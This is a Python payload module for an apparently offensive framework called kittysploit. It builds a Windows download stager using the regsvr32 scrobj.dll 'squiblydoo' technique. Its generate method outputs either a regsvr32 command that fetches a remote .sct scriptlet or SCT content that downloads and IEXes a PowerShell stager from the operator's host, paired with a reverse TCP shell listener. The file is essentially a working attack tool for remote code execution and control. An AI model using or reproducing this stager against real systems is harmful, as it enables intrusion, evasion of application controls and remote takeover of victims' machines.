#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *

from lib.c2.download_stagers import build_regsvr32_sct, build_sct_iex_wrapper, build_stager_url


class Module(Payload):
    __info__ = {
        "name": "Windows Download Stager, regsvr32 SCT",
        "description": (
            "regsvr32 /i:URL scrobj.dll (squiblydoo). Host stager.sct on stager_port — "
            "use delivery=sct_content to print a scriptlet that IEXs stager.ps1."
        ),
        "category": PayloadCategory.CMD,
        "platform": Platform.WINDOWS,
        "listener": "listeners/multi/reverse_tcp",
        "handler": Handler.REVERSE,
        "session_type": SessionType.SHELL,
    }

    lhost = OptString("127.0.0.1", "Operator host", True)
    lport = OptPort(4444, "Callback port", True)
    stager_url = OptString("", "Full URL of hosted .sct scriptlet", False)
    stager_port = OptInteger(8000, "HTTP port when stager_url empty", False, advanced=True)
    ps1_url = OptString("", "Remote .ps1 for SCT wrapper (delivery=sct_content)", False)
    delivery = OptChoice(
        "oneliner",
        "oneliner = regsvr32 command; sct_content = XML to save as stager.sct",
        False,
        choices=["oneliner", "sct_content"],
    )

    def generate(self):
        if str(self.delivery or "oneliner") == "sct_content":
            ps1 = str(self.ps1_url or "").strip()
            if not ps1:
                ps1 = build_stager_url(str(self.lhost), int(self.stager_port or 8000), "/stager.ps1")
                print_info(f"ps1_url not set — SCT will IEX {ps1}")
            return build_sct_iex_wrapper(ps1)

        url = str(self.stager_url or "").strip()
        if not url:
            url = build_stager_url(str(self.lhost), int(self.stager_port or 8000), "/stager.sct")
            print_info(f"stager_url not set — using {url} (host .sct on stager_port)")
        return build_regsvr32_sct(url)
